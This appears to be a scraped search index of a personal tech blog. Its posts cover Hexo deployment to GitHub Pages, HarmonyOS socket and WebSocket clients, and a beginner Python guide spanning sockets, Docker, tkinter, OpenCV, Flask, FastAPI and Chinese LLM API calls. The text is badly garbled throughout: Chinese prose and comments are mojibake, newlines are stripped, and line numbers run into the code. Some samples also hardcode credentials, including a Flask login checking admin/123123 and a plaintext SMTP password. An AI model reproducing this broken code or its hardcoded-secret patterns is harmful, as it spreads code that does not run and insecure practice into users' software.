hexo-cli -ghexo init blogcd blognpm installhexo server keyé…ç½®ssh-keygen -t ed25519 -C â€œ&#101;&#x6d;&#x61;&#x69;&#108;&#x40;&#101;&#46;&#99;&#111;&#x6d;â€œæ·»åŠ keyåˆ°github err&#x67;&#x69;&#x74;&#x40;&#x67;&#105;&#116;&#x68;&#117;&#x62;&#x2e;&#99;&#111;&#x6d;: Permission denied (publickey).fatal: Could not read from remote repository. é…ç½®GitHubä»“åº“åœ¨GitHubä¸Šåˆ›å»ºä¸€ä¸ªæ–°çš„ä»“åº“ï¼Œå…¶åç§°åº”è¯¥æ˜¯ ç”¨æˆ·å.github.ioï¼Œå…¶ä¸­ç”¨æˆ·åæ˜¯ä½ çš„GitHubç”¨æˆ·åã€‚ git config â€“global user.email â€œ&#120;&#120;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;â€œ git config â€“global user.name â€œuserâ€ _config.ymldeploy: type: git repo: # æ›¿æ¢ä¸ºä½ çš„GitHubä»“åº“url branch: master å®‰è£…hexo-deployer-gitæ’ä»¶ï¼šnpm install hexo-deployer-git â€“save éƒ¨ç½²åˆ°GitHubï¼šhexo cleanhexo g #hexo generatehexo d #hexo deploy å»ºç«‹ä»“åº“ testhtmlSettings -&gt; pages https://xxx.github.io/testhtml/index.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"github","slug":"github","permalink":"https://banjinmei.github.io/tags/github/"},{"name":"hexo","slug":"hexo","permalink":"https://banjinmei.github.io/tags/hexo/"}],"author":"mu"},{"title":"HarmonyOS socket websocket","slug":"HarmonyOS-Socket","date":"2024-05-26T15:56:19.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/05/26/HarmonyOS-Socket/","permalink":"https://banjinmei.github.io/2024/05/26/HarmonyOS-Socket/","excerpt":"","text":"socket1import socket from &#x27;@ohos.net.socket&#x27;; create 12345678910111213141516let tcp = socket.constructTCPSocketInstance();let promise = tcp.connect(&#123; address: &#123;address: &#x27;192.168.1.11&#x27;, port: 24524, family: 1&#125; , timeout: 6000&#125;);promise.then(() =&gt; &#123; console.log(&#x27;connect success&#x27;); tcp.send(&#123; data:&#x27;Hello, server!&#x27; &#125;,err =&gt; &#123; if (err) &#123; console.log(&#x27;send fail&#x27;); return; &#125; console.log(&#x27;send success&#x27;); &#125;)&#125;).catch(err =&gt; &#123; console.log(&#x27;connect fail&#x27;);&#125;); ERRç³»ç»Ÿè¯†åˆ«åˆ°æ–°çš„sdkè·¯å¾„ è¯·æ¸…é™¤æ¨¡æ‹Ÿå™¨æ•°æ®åSdk Path has been changed to xxx 1.åœ¨Local Emulatorçš„è®¾å¤‡åˆ—è¡¨çª—å£ï¼Œç‚¹å‡»â€œWipe User Dataâ€æ¸…é™¤æ¨¡æ‹Ÿå™¨æ•°æ®ï¼Œç„¶åé‡æ–°å¯åŠ¨æ¨¡æ‹Ÿå™¨ã€‚2.é‡æ–°åˆ›å»ºä¸€ä¸ªæ¨¡æ‹Ÿå™¨ï¼Œç„¶åå¯åŠ¨æ–°å»ºçš„æ¨¡æ‹Ÿå™¨ã€‚ console.log Log &#x3D;&gt; show only js log ERR201module.json5æ·»åŠ  12345&quot;requestPermissions&quot;: [ &#123; &quot;name&quot;: &quot;ohos.permission.INTERNET&quot; &#125;] ERRconnect fail2301088 éœ€æ·»åŠ æœ¬æœºIP 12345let bindAddress = &#123; address: &#x27;localhost&#x27;, port: 1234, family: 1 &#125;; node server 123456789101112131415161718const net = require(&#x27;net&#x27;);//createServerconst server = net.createServer((socket) =&gt; &#123; console.log(&#x27;client con&#x27;); socket.on(&#x27;data&#x27;, (data) =&gt; &#123; console.log(`rs from client : $&#123;data&#125;`); socket.write(`rs server : $&#123;data&#125;`); &#125;); socket.on(&#x27;end&#x27;, () =&gt; &#123; console.log(&#x27;client end &#x27;); &#125;);&#125;);server.listen(24524, () =&gt; &#123; console.log(&#x27;tcp run on 24524&#x27;);&#125;); run client â€‹ webscoket1import webSocket from &#x27;@ohos.net.webSocket&#x27;; 123456789101112let ws = webSocket.createWebSocket();let url = &quot;ws://xxx:24524&quot;ws.connect(url, (err, value) =&gt; &#123; let promise = ws.send(&quot;Hello, server!&quot;); promise.then((value) =&gt; &#123; console.log(&quot;send success&quot;) &#125;).catch((err) =&gt; &#123; console.log(&quot;send fail, error:&quot; + JSON.stringify(err)) &#125;);&#125;); æƒé™ohos.permission.INTERNET websocketæ›´åŠ ç®€å•ä¸€ç‚¹~~ â€‹","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"Python helloworldï¼get/post mysql requests socket docker opencv flask fastapi debian ubuntu sparkai","slug":"Python-Base","date":"2024-05-26T15:02:42.000Z","updated":"2024-11-13T16:30:44.673Z","comments":true,"path":"2024/05/26/Python-Base/","permalink":"https://banjinmei.github.io/2024/05/26/Python-Base/","excerpt":"","text":"ğŸŒ setupå®‰è£…python.org ğŸ·helloworld12if __name__ == &#x27;__main__&#x27;: print(&#x27;helloworld&#x27;) 1python test.py varå˜é‡ 12345if __name__ == &#x27;__main__&#x27;: company, date, *others = [&#x27;hi&#x27;, &#x27;20240521&#x27;, &#x27;000&#x27;, &#x27;11111&#x27;] print(company, date) print(others) randoméšæœº 12345678910111213 i = 0rand_list = []while i &lt; 4: rand_num = random.randint(0, 499) if rand_num not in rand_list: rand_list.append(rand_num) i += 1 print(rand_list) liståˆ—è¡¨ å¯å˜ 1234567891011121314151617181920212223242526# åˆ›å»ºä¸€ä¸ªç©ºåˆ—è¡¨ my_list = [] # å‘åˆ—è¡¨ä¸­æ·»åŠ å…ƒç´  my_list.append(1) my_list.append(2) my_list.append(3) print(my_list) # è¾“å‡º: [1, 2, 3] # ä¿®æ”¹åˆ—è¡¨ä¸­çš„å…ƒç´  my_list[1] = &#x27;two&#x27; print(my_list) # è¾“å‡º: [1, &#x27;two&#x27;, 3] # åˆ—è¡¨åˆ‡ç‰‡ sub_list = my_list[1:3] print(sub_list) # è¾“å‡º: [&#x27;two&#x27;, 3] # åˆ é™¤åˆ—è¡¨ä¸­çš„å…ƒç´  del my_list[2] print(my_list) # è¾“å‡º: [1, &#x27;two&#x27;]# åˆ›å»ºä¸€ä¸ªåŒ…å«0åˆ°9çš„å¶æ•°åˆ—è¡¨ even_numbers = [i for i in range(10) if i % 2 == 0] print(even_numbers) # è¾“å‡º: [0, 2, 4, 6, 8] tupleå…ƒç»„ ä¸å¯å˜ 123456789101112# åˆ›å»ºä¸€ä¸ªå…ƒç»„ my_tuple = (1, &#x27;two&#x27;, 3.0) print(my_tuple) # è¾“å‡º: (1, &#x27;two&#x27;, 3.0) # å°è¯•ä¿®æ”¹å…ƒç»„ä¸­çš„å…ƒç´ ï¼ˆä¼šæŠ›å‡ºTypeErrorï¼‰ ## my_tuple[1] = &#x27;Two&#x27; # è¿™è¡Œä»£ç ä¼šæŠ¥é”™ï¼Œå› ä¸ºå…ƒç»„æ˜¯ä¸å¯å˜çš„ # å…ƒç»„åˆ‡ç‰‡ï¼ˆè™½ç„¶å…ƒç»„ä¸å¯å˜ï¼Œä½†ä½ å¯ä»¥è·å–å®ƒçš„åˆ‡ç‰‡ï¼‰ sub_tuple = my_tuple[1:] print(sub_tuple) # è¾“å‡º: (&#x27;two&#x27;, 3.0) if elseåˆ¤æ–­ 123456789age =5if age &gt;= 6: print(&#x27;teenager&#x27;)elif age &gt;= 20: print(&#x27;old&#x27;)else: print(&#x27;kid&#x27;) calculatorè®¡ç®—å™¨ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152def add(x, y): &quot;&quot;&quot;åŠ æ³•&quot;&quot;&quot; return x + ydef subtract(x, y): &quot;&quot;&quot;å‡æ³•&quot;&quot;&quot; return x - ydef multiply(x, y): &quot;&quot;&quot;ä¹˜æ³•&quot;&quot;&quot; return x * ydef divide(x, y): &quot;&quot;&quot;é™¤æ³•&quot;&quot;&quot; if y == 0: return &quot;é”™è¯¯ï¼šé™¤æ•°ä¸èƒ½ä¸º0&quot; else: return x / yprint(&quot;é€‰æ‹©æ“ä½œï¼š&quot;)print(&quot;1.åŠ æ³•&quot;)print(&quot;2.å‡æ³•&quot;)print(&quot;3.ä¹˜æ³•&quot;)print(&quot;4.é™¤æ³•&quot;)while True: choice = input(&quot;è¯·è¾“å…¥ä½ çš„é€‰æ‹©(1/2/3/4): &quot;) if choice in (&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;): num1 = float(input(&quot;è¯·è¾“å…¥ç¬¬ä¸€ä¸ªæ•°å­—: &quot;)) num2 = float(input(&quot;è¯·è¾“å…¥ç¬¬äºŒä¸ªæ•°å­—: &quot;)) if choice == &#x27;1&#x27;: print(num1, &quot;+&quot;, num2, &quot;=&quot;, add(num1, num2)) elif choice == &#x27;2&#x27;: print(num1, &quot;-&quot;, num2, &quot;=&quot;, subtract(num1, num2)) elif choice == &#x27;3&#x27;: print(num1, &quot;*&quot;, num2, &quot;=&quot;, multiply(num1, num2)) elif choice == &#x27;4&#x27;: result = divide(num1, num2) print(num1, &quot;/&quot;, num2, &quot;=&quot;, result) # æ£€æŸ¥ç”¨æˆ·æ˜¯å¦æƒ³ç»§ç»­è®¡ç®— next_calculation = input(&quot;æƒ³è¦è¿›è¡Œä¸‹ä¸€æ¬¡è®¡ç®—å—ï¼Ÿ(yes/no): &quot;) if next_calculation.lower() != &#x27;yes&#x27;: break else: print(&quot;éæ³•è¾“å…¥ï¼Œè¯·é‡æ–°è¾“å…¥&quot;) 123456789import requests# getresponse = requests.get(&#x27;https://jsonplaceholder.typicode.com/posts/1&#x27;)print(response.json())# postdata = &#123;&#x27;title&#x27;: &#x27;foo&#x27;, &#x27;body&#x27;: &#x27;bar&#x27;, &#x27;userId&#x27;: 1&#125;response = requests.post(&#x27;https://jsonplaceholder.typicode.com/posts&#x27;, json=data)print(response.json()) ğŸmail1234567891011121314151617181920212223242526272829303132333435import smtplib from email.mime.text import MIMEText from email.mime.multipart import MIMEMultipart # è®¾ç½®é‚®ä»¶æœåŠ¡å™¨å’Œç«¯å£ smtp_server = &#x27;smtp.qq.com&#x27; smtp_port = 25 # è®¾ç½®å‘ä»¶äººå’Œæ”¶ä»¶äººä¿¡æ¯ sender_email = &#x27;42@qq.com&#x27; # é‚®ç®±åœ°å€ sender_password = &#x27;lpoumq&#x27; # å¯†ç  receiver_email = &#x27;76@qq.com&#x27; # æ”¶ä»¶äººé‚®ç®±åœ°å€ msg = MIMEMultipart() msg[&#x27;From&#x27;] = sender_email msg[&#x27;To&#x27;] = receiver_email msg[&#x27;Subject&#x27;] = &#x27;Hello from Python&#x27; body = &#x27;This is a test email sent from Python. mmmmmmm &#x27; msg.attach(MIMEText(body, &#x27;plain&#x27;)) with smtplib.SMTP(smtp_server, smtp_port) as server: server.starttls() server.login(sender_email, sender_password) # å‘é€é‚®ä»¶ server.sendmail(sender_email, receiver_email, msg.as_string()) print(&#x27;Email sent successfully!&#x27;) ğŸ´socketclient 1234567891011121314151617181920212223242526import socket def connect_to_socket(host, port): # åˆ›å»ºä¸€ä¸ªæ–°çš„socketå¯¹è±¡ï¼ŒæŒ‡å®šIPv4å’ŒTCP client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # è¿æ¥åˆ°æœåŠ¡å™¨ try: client_socket.connect((host, port)) print(f&quot;æˆåŠŸè¿æ¥åˆ° &#123;host&#125;:&#123;port&#125;&quot;) message = &quot;Hello, Server!&quot;.encode(&#x27;utf-8&#x27;) client_socket.sendall(message) # æ¥æ”¶æ•°æ® data = client_socket.recv(1024) print(f&quot;ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„æ•°æ®: &#123;data.decode(&#x27;utf-8&#x27;)&#125;&quot;) except Exception as e: print(f&quot;è¿æ¥å¤±è´¥: &#123;e&#125;&quot;) finally: # å…³é—­socketè¿æ¥ client_socket.close() connect_to_socket(&#x27;localhost&#x27;, 6001) server 12345678910111213141516171819202122232425262728293031323334353637383940414243import socket def start_server(host, port): server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ç»‘å®šsocketåˆ°æŒ‡å®šçš„åœ°å€å’Œç«¯å£ server_address = (host, port) print(f&quot;æœåŠ¡å™¨å°†è¿è¡Œåœ¨ &#123;host&#125;:&#123;port&#125;&quot;) server_socket.bind(server_address) # å¼€å§‹ç›‘å¬è¿æ¥ server_socket.listen(1) while True: print(&quot;ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥...&quot;) connection, client_address = server_socket.accept() try: print(f&quot;å®¢æˆ·ç«¯ &#123;client_address&#125; å·²è¿æ¥&quot;) # æ¥æ”¶æ•°æ® while True: data = connection.recv(1024) if not data: print(&quot;å®¢æˆ·ç«¯å·²æ–­å¼€è¿æ¥&quot;) break print(f&quot;ä» &#123;client_address&#125; æ¥æ”¶åˆ°çš„æ•°æ®: &#123;data.decode(&#x27;utf-8&#x27;)&#125;&quot;) # å‘é€ä¸€äº›æ•°æ®å›å®¢æˆ·ç«¯ response = &quot;Hello from server!&quot;.encode(&#x27;utf-8&#x27;) connection.sendall(response) except ConnectionResetError: print(&quot;å®¢æˆ·ç«¯å¼‚å¸¸æ–­å¼€è¿æ¥&quot;) finally: # æ¸…ç†è¿æ¥ connection.close() start_server(&#x27;localhost&#x27;, 6002) ğŸdockerserver123456789101112131415161718192021222324# testdk.pyimport socketdef run_server(): host = &#x27;0.0.0.0&#x27; # ç›‘å¬æ‰€æœ‰ç½‘ç»œæ¥å£ port = 12345 # è‡ªå®šä¹‰ç«¯å£å· with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.bind((host, port)) s.listen() print(f&quot;Server listening on &#123;host&#125;:&#123;port&#125;&quot;) while True: conn, addr = s.accept() with conn: print(f&quot;Connected by &#123;addr&#125;&quot;) data = conn.recv(1024) if not data: break conn.sendall(data)if __name__ == &quot;__main__&quot;: run_server() Dockerfile1234567891011# DockerfileFROM python:3.8-slim-busterWORKDIR /appCOPY requirements.txt ./RUN pip install --no-cache-dir -r requirements.txtCOPY . .CMD [&quot;python&quot;, &quot;./testdk.py&quot;] build1docker build -t my-python-socket-server . run1docker run -d -p 12345:12345 my-python-socket-server client test123456789# testdkclient2.pyimport socketwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.connect((&#x27;localhost&#x27;, 12345)) s.sendall(b&#x27;Hello, Server!mmmm&#x27;) data = s.recv(1024) print(&#x27;Received&#x27;, repr(data)) ğŸ²GraphicsTurtle123456789101112131415161718192021222324252627# å¯¼å…¥turtleåŒ…çš„æ‰€æœ‰å†…å®¹:from turtle import *# è®¾ç½®ç¬”åˆ·å®½åº¦:width(5)# å‰è¿›:forward(100)# å³è½¬90åº¦:right(90)# ç¬”åˆ·é¢œè‰²:pencolor(&#x27;yellow&#x27;)forward(150)right(90)pencolor(&#x27;red&#x27;)forward(100)right(90)pencolor(&#x27;blue&#x27;)forward(100)right(90)# è°ƒç”¨done()ä½¿å¾—çª—å£ç­‰å¾…è¢«å…³é—­ï¼Œå¦åˆ™å°†ç«‹åˆ»å…³é—­çª—å£:done() 12345678910111213141516171819202122232425262728import turtle # åˆå§‹åŒ–turtle window = turtle.Screen() window.bgcolor(&quot;white&quot;) # è®¾ç½®èƒŒæ™¯é¢œè‰²ä¸ºé»‘è‰² love = turtle.Turtle() love.speed(1) # è®¾ç½®ç»˜å›¾é€Ÿåº¦ï¼Œ1æ˜¯æœ€æ…¢ï¼Œ0æ˜¯æœ€å¿« love.color(&quot;red&quot;, &quot;pink&quot;) # è®¾ç½®ç”»ç¬”é¢œè‰²å’Œå¡«å……é¢œè‰² love.begin_fill() # å¼€å§‹å¡«å……é¢œè‰² # ç»˜åˆ¶çˆ±å¿ƒçš„å·¦åŠéƒ¨åˆ† love.left(140) love.forward(180) love.circle(-100, 200) # ç»˜åˆ¶ä¸€ä¸ªåŠå¾„ä¸º100ï¼Œå¼§åº¦ä¸º200çš„åœ†ï¼ˆåœ†å¿ƒåœ¨å·¦ä¾§ï¼‰ # ç»˜åˆ¶çˆ±å¿ƒçš„å³åŠéƒ¨åˆ† love.left(120) love.circle(-100, 200) # ç»˜åˆ¶ä¸€ä¸ªåŠå¾„ä¸º100ï¼Œå¼§åº¦ä¸º200çš„åœ†ï¼ˆåœ†å¿ƒåœ¨å³ä¾§ï¼‰ # å›åˆ°èµ·ç‚¹å¹¶ç»“æŸå¡«å…… love.forward(180) love.end_fill() # éšè—turtleå›¾æ ‡ love.hideturtle() # ç»“æŸç»˜åˆ¶ï¼Œç­‰å¾…ç”¨æˆ·å…³é—­çª—å£ turtle.done() tkinter12345678910111213import tkinter as tk def on_closing(): root.destroy() # å½“ç‚¹å‡»å…³é—­æŒ‰é’®æ—¶è°ƒç”¨ root = tk.Tk() root.protocol(&quot;WM_DELETE_WINDOW&quot;, on_closing) label = tk.Label(root, text=&quot;Hello, Tkinter!&quot;) label.pack() root.mainloop() ä¸‹ç­ï¼123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import tkinter as tkfrom tkinter import messageboxfrom datetime import datetime, timedeltaimport timedef validate_time(input_time): &quot;&quot;&quot;éªŒè¯è¾“å…¥çš„æ—¶é—´æ ¼å¼æ˜¯å¦æ­£ç¡®&quot;&quot;&quot; try: time.strptime(input_time, &#x27;%H:%M:%S&#x27;) return True except ValueError: return Falsedef start_countdown(): input_time = entry.get() if validate_time(input_time): target_time = datetime.strptime(input_time, &#x27;%H:%M:%S&#x27;) today = datetime.combine(datetime.today(), datetime.min.time()) target_datetime = datetime.combine(today, target_time.time()) if target_datetime &lt; datetime.now(): target_datetime += timedelta(days=1) def update_countdown(): now = datetime.now() remaining_time = target_datetime - now if remaining_time.total_seconds() &lt;= 0: label.config(text=&quot;ä¸‹ç­!å¤´ä¹Ÿä¸å›&quot;) messagebox.showinfo(&quot;Timer&quot;, &quot;ä¸‹ç­!å¤´ä¹Ÿä¸å›&quot;) else: hours, remainder = divmod(remaining_time.seconds, 3600) minutes, seconds = divmod(remainder, 60) label.config(text=f&quot;&#123;hours:02d&#125;:&#123;minutes:02d&#125;:&#123;seconds:02d&#125;&quot;) window.after(1000, update_countdown) # timeout update_countdown() else: messagebox.showerror(&quot;Error&quot;, &quot;æ—¶é—´å¿…é¡»æ˜¯ HH:MM:SS.&quot;)# windowwindow = tk.Tk()window.title(&quot;ä¸‹ç­!å¤´ä¹Ÿä¸å›&quot;)window.geometry(&quot;400x300&quot;)# Entrytk.Label(window, text=&quot;ä¸‹ç­æ—¶é—´ &gt; HH:MM:SS :&quot;).pack()entry = tk.Entry(window)entry.pack()# Buttonstart_button = tk.Button(window, text=&quot;å¼€å§‹æ‘¸é±¼ğŸŸ&quot;, command=start_countdown)start_button.pack()start_button.pack(pady=10)label = tk.Label(window, text=&quot;&quot;, font=(&quot;Helvetica&quot;, 48))label.pack(pady=20)window.mainloop() ğŸ‡opencv1pip install opencv-python 1234567891011import cv2#readimage = cv2.imread(&#x27;e1.jpg&#x27;)if image is None: print(&quot;Error: Image not found or unable to read.&quot;)else: cv2.imshow(&#x27;Image&#x27;, image) cv2.waitKey(0) cv2.destroyAllWindows() cv2.imwrite(&#x27;output.jpg&#x27;, image) 12#åè‰²å¤„ç† inverted_image = cv2.bitwise_not(image) Pillow PILå›¾åƒå¤„ç†åº“ 1pip install Pillow 1234567891011121314151617181920212223242526272829303132333435363738394041from PIL import Image# åŠ è½½å›¾ç‰‡image = Image.open(&#x27;e1.jpg&#x27;)image.show()# ç¼©æ”¾åˆ°å®½åº¦ä¸º300ï¼Œé«˜åº¦ç­‰æ¯”ä¾‹ç¼©æ”¾image = Image.open(&#x27;e1.jpg&#x27;)image_resized = image.resize((300, image.height * 300 // image.width))# saveimage_resized.save(&#x27;resized240525.jpg&#x27;)# è½¬æ¢æˆPNGæ ¼å¼image = Image.open(&#x27;e1.jpg&#x27;)image.save(&#x27;png240525.png&#x27;, format=&#x27;PNG&#x27;)# è½¬æ¢æˆPNGæ ¼å¼image = Image.open(&#x27;png240525.png&#x27;)image.save(&#x27;j240525.jpg&#x27;, format=&#x27;jpeg&#x27;)# è£å‰ªå›¾ç‰‡ï¼Œå‚æ•°æ˜¯å·¦ä¸Šè§’å’Œå³ä¸‹è§’çš„åæ ‡image = Image.open(&#x27;e1.jpg&#x27;)cropped_image = image.crop((100, 100, 400, 400))cropped_image.show()cropped_image.save(&#x27;cropped_image240525.jpg&#x27;)# é¡ºæ—¶é’ˆæ—‹è½¬90åº¦image = Image.open(&#x27;e1.jpg&#x27;)rotated_image = image.rotate(90)rotated_image.show()rotated_image.save(&#x27;rotated_image240525.jpg&#x27;)from PIL import Image, ImageFilter#æ¨¡ç³Šæ»¤é•œimage = Image.open(&#x27;e1.jpg&#x27;)blurred_image = image.filter(ImageFilter.BLUR)blurred_image.show()blurred_image.save(&#x27;blurred_image240525.jpg&#x27;) ğŸ¯PyTorchæœºå™¨å­¦ä¹  12pip install torch torchvisionpip install pillow 123456789101112131415161718192021222324252627282930313233import torchimport torchvision.transforms as transformsfrom torchvision.models import resnet50from PIL import Image# ResNet50model = resnet50(pretrained=True)model.eval() #eval# transform transform = transforms.Compose([ transforms.Resize(256), transforms.CenterCrop(224), transforms.ToTensor(), transforms.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]),])# PILimage_path = &#x27;e1.jpg&#x27; image = Image.open(image_path)# transform imageimage_tensor = transform(image)image_tensor = image_tensor.unsqueeze(0) # æ·»åŠ batchç»´åº¦# tensoroutput = model(image_tensor)# predictedclass _, pred = output.max(1)predicted_class = pred.item()print(&quot;Predicted class index:&quot;, predicted_class) ğŸ‚web1234567891011# ä»wsgirefæ¨¡å—å¯¼å…¥:from wsgiref.simple_server import make_server# å¯¼å…¥æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„applicationå‡½æ•°:from hi import application# åˆ›å»ºä¸€ä¸ªæœåŠ¡å™¨ï¼ŒIPåœ°å€ä¸ºç©ºï¼Œç«¯å£æ˜¯8000ï¼Œå¤„ç†å‡½æ•°æ˜¯application:httpd = make_server(&#x27;&#x27;, 8000, application)print(&#x27;Serving HTTP on port 8000...&#x27;)# å¼€å§‹ç›‘å¬HTTPè¯·æ±‚:httpd.serve_forever() 1234#hi.pydef application(environ, start_response): start_response(&#x27;200 OK&#x27;, [(&#x27;Content-Type&#x27;, &#x27;text/html&#x27;)]) return [b&#x27;&lt;h1&gt;Hello, web!&lt;/h1&gt;&#x27;] flask1pip install flask 123456789101112131415161718192021222324252627from flask import Flaskfrom flask import requestapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def home(): return &#x27;&lt;h1&gt;Home&lt;/h1&gt;&#x27;@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;])def signin_form(): return &#x27;&#x27;&#x27;&lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt; &lt;p&gt;&lt;input name=&quot;username&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;button type=&quot;submit&quot;&gt;Sign In&lt;/button&gt;&lt;/p&gt; &lt;/form&gt;&#x27;&#x27;&#x27;@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])def signin(): # éœ€è¦ä»requestå¯¹è±¡è¯»å–è¡¨å•å†…å®¹ï¼š if request.form[&#x27;username&#x27;]==&#x27;admin&#x27; and request.form[&#x27;password&#x27;]==&#x27;123123&#x27;: return &#x27;&lt;h3&gt;Hello, admin!&lt;/h3&gt;&#x27; return &#x27;&lt;h3&gt;Bad username or password.&lt;/h3&gt;&#x27;if __name__ == &#x27;__main__&#x27;: app.run() fastapi1pip install fastapi uvicorn[standard] 123456789101112131415#y.pfrom fastapi import FastAPI app = FastAPI() @app.get(&quot;/&quot;) def read_root(): return &#123;&quot;Hello&quot;: &quot;World&quot;&#125; @app.get(&quot;/items/&#123;item_id&#125;&quot;) def read_item(item_id: int, q: str = None): return &#123;&quot;item_id&quot;: item_id, &quot;q&quot;: q&#125; 1uvicorn y:app --reload 12http://127.0.0.1:8000/ &#123;&quot;Hello&quot;: &quot;World&quot;&#125;ï¼Œhttp://127.0.0.1:8000/items/5?q=m &#123;&quot;item_id&quot;: 5, &quot;q&quot;: &quot;m&quot;&#125; ğŸ­debian setup python3.91sudo apt update 1sudo apt install -y wget build-essential libreadline-gplv2-dev libncursesw5-dev libssl-dev libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev 123#dlcd /usr/srcsudo wget https://www.python.org/ftp/python/3.9.0/Python-3.9.0.tgz 12sudo tar xzf Python-3.9.0.tgzcd Python-3.9.0 12sudo ./configure --enable-optimizationssudo make -j 4 # æ›¿æ¢4ä¸ºä½ çš„CPUæ ¸å¿ƒæ•° 1sudo make altinstall # ä½¿ç”¨altinstallä»¥é¿å…è¦†ç›–ç³»ç»Ÿé»˜è®¤çš„pythonç‰ˆæœ¬ 1python3.9 --version ubuntu python1sudo apt update 1sudo apt install -y make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev 1wget https://www.python.org/ftp/python/3.12.0/Python-3.12.0.tgz 1tar -xzf Python-3.12.0.tgz -C /usr/local/src/ 1cd /usr/local/src/Python-3.12.0/ 1./configure --prefix=/usr/local 1make 1sudo make install â˜„ï¸aispark_aiè®¯é£æ˜Ÿç«è®¤çŸ¥å¤§æ¨¡å‹v3.5 1apt install python3-pip 1pip install --upgrade spark_ai_python 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# coding: utf-8import SparkApiimport timeappid = &quot;xxx&quot; #å¡«å†™æ§åˆ¶å°ä¸­è·å–çš„ APPID ä¿¡æ¯api_secret = &quot;xxx&quot; #å¡«å†™æ§åˆ¶å°ä¸­è·å–çš„ APISecret ä¿¡æ¯api_key =&quot;xxx&quot; #å¡«å†™æ§åˆ¶å°ä¸­è·å–çš„ APIKey ä¿¡æ¯domain = &quot;generalv3.5&quot; Spark_url = &quot;wss://spark-api.xf-yun.com/v3.5/chat&quot; # v3.5ç¯æœåŠ¡åœ°å€#åˆå§‹ä¸Šä¸‹æ–‡å†…å®¹ï¼Œå½“å‰å¯ä¼ systemã€userã€assistant ç­‰è§’è‰²text =[ # &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;ä½ æ˜¯è°&quot;&#125;, # ç”¨æˆ·çš„å†å²é—®é¢˜]def getText(role,content): jsoncon = &#123;&#125; jsoncon[&quot;role&quot;] = role jsoncon[&quot;content&quot;] = content text.append(jsoncon) return textdef getlength(text): length = 0 for content in text: temp = content[&quot;content&quot;] leng = len(temp) length += leng return lengthdef checklen(text): while (getlength(text) &gt; 8000): del text[0] return text if __name__ == &#x27;__main__&#x27;: while(1): Input = input(&quot;\\n&quot; +&quot;æˆ‘:&quot;) question = checklen(getText(&quot;user&quot;,Input)) SparkApi.answer =&quot;&quot; print(&quot;æ˜Ÿç«:&quot;,end =&quot;&quot;) SparkApi.main(appid,api_key,api_secret,Spark_url,domain,question) # print(SparkApi.answer) getText(&quot;assistant&quot;,SparkApi.answer) ERNIE-4.0åƒå¸†4.0 1234567891011121314151617181920212223242526272829303132333435363738import requestsimport jsondef get_access_token(): url = &quot;https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id=xx&amp;client_secret=xx&quot; payload = json.dumps(&quot;&quot;) headers = &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27;, &#x27;Accept&#x27;: &#x27;application/json&#x27; &#125; response = requests.request(&quot;POST&quot;, url, headers=headers, data=payload) return response.json().get(&quot;access_token&quot;)def main(): url = &quot;https://aip.baidubce.com/rpc/2.0/ai_custom/v1/wenxinworkshop/chat/ernie-4.0-8k-preview?access_token=&quot; + get_access_token() payload = json.dumps(&#123; &quot;messages&quot;: [ &#123; &quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Pythonæ˜¯æœ€å¥½çš„è¯­è¨€&quot; &#125; ] &#125;) headers = &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125; response = requests.request(&quot;POST&quot;, url, headers=headers, data=payload) print(response.text) if __name__ == &#x27;__main__&#x27;: main() 12345python3 ai.py&#123;&quot;id&quot;:&quot;as-7bdgaekpn4&quot;,&quot;object&quot;:&quot;chat.completion&quot;,&quot;created&quot;:1716369031,&quot;result&quot;:&quot;\\&quot;Pythonæ˜¯æœ€å¥½çš„è¯­è¨€\\&quot;è¿™ä¸€è¯´æ³•æ˜¯ä¸»è§‚çš„ï¼Œå¹¶ä¸é€‚ç”¨äºæ‰€æœ‰æƒ…å†µã€‚Pythonç¡®å®æ˜¯ä¸€ç§å¼ºå¤§ä¸”æµè¡Œçš„ç¼–ç¨‹è¯­è¨€ï¼Œå…·æœ‰è®¸å¤šä¼˜ç‚¹ï¼Œä½†å®ƒå¹¶ä¸ä¸€å®šæ˜¯æ‰€æœ‰æƒ…å†µä¸‹çš„æœ€ä½³é€‰æ‹©ã€‚ä»¥ä¸‹æ˜¯å¯¹è¿™ä¸€è¯´æ³•çš„è¯¦ç»†åˆ†æï¼š\\n\\n### Pythonçš„ä¼˜ç‚¹ï¼š\\n\\n1. 